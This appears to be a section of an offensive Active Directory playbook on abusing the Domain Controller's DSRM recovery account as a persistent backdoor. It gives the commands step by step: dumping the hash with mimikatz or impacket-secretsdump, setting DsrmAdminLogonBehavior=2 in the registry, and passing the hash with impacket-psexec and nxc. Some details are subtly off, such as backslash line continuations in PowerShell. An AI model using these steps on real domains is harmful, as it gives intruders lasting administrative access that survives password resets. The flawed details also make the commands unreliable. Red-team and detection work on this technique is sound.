---
title: "17 · DSRM (Directory Services Restore Mode) Abuse"
---

# 17 · DSRM (Directory Services Restore Mode) Abuse

> Every DC has a local recovery account. Convert it into a backdoor.

!!! note "Phase overview"
    `DSRM` is the local Administrator password on every DC, used for offline recovery. By default it can't authenticate over the network, but flip a registry key ***`(DsrmAdminLogonBehavior=2)`*** and it becomes a persistent backdoor that survives every domain-level password change. The hash lives in the local SAM, not the `NTDS.dit`, so even a krbtgt rotation doesn't kill it.

### 17.1 · DSRM Persistence/Abuse

!!! info "Why this works / how it chains (3 Steps:)"
    - Dump the DSRM hash via lsadump::sam (mimikatz on DC) or secretsdump's local-SAM portion. 
    - Set DsrmAdminLogonBehavior=2 to allow network logon. 
    - Then PtH against the DC using .\administrator (the leading .\ specifies the LOCAL account, not the domain one that getting this wrong is the #1 mistake).

!!! warning "What leads here"
    - Have Domain Admin / DA equivalent
    - Want persistent access that survives password resets
    - DSRM account is local admin on the DC

```powershell title="Step 1 : dump DSRM hash"
# Via mimikatz on DC:
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
# Look for: Administrator NTLM hash (local, not domain)

# Via secretsdump
impacket-secretsdump domain.local/administrator:pass@<DC_IP> -just-dc-user "domain\administrator"
# Also dumps local SAM → DSRM hash is the local Administrator
```

```powershell title="Step 2 : enable DSRM network logon"
# On the DC (needs local admin):
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" \
  -Name "DsrmAdminLogonBehavior" \
  -Value 2 \
  -PropertyType DWORD -Force
# Value 2 = always allow DSRM logon
```

```bash title="Step 3 : PtH as local admin"
# Must use .\Administrator (local) not domain\Administrator
impacket-psexec '.\administrator'@<DC_IP> -hashes :<DSRM_NTLM_HASH>
nxc smb <DC_IP> -u administrator -H <DSRM_HASH> --local-auth
```

